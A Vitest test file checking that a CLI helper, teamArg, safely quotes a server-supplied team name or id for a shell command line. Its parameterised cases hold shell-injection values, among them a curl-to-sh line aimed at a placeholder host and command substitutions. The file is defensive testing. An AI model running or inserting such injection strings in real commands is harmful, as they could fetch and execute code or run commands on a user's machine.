import { describe, it, expect } from 'vitest'
import { execFileSync } from 'node:child_process'
import { teamArg } from '../src/cloud-commands.js'

// Spec 080 review: the team in the "run: veilio team trust …" line is copied
// into a shell. Its name and its id both come from the server.

/** What a POSIX shell makes of `arg` as one command-line word. */
function shellWords(arg: string): string[] {
  const out = execFileSync('sh', ['-c', `set -- ${arg}; printf '%s\\0' "$@"`], {
    encoding: 'utf8',
  })
  return out.split('\0').slice(0, -1)
}

describe('teamArg', () => {
  it('a plain name is used as it is', () => {
    expect(teamArg('Zespół_Kraków-2.0', 'team-1')).toBe('Zespół_Kraków-2.0')
  })

  it('a name that is not plain falls back to a plain id', () => {
    expect(teamArg('Zespół Kraków', 'team-1')).toBe('team-1')
  })

  it.each([
    'x;curl evil|sh;#',
    'a|b',
    '$(touch /tmp/veilio-pwned)',
    '`id`',
    'two words',
    "it's",
    "'",
    '-rf',
  ])('an id that is not plain either, %j, reaches the shell as exactly one word, itself', (id) => {
    const arg = teamArg('not plain', id)
    expect(arg).not.toBe(id)
    expect(shellWords(arg)).toEqual([id])
  })
})
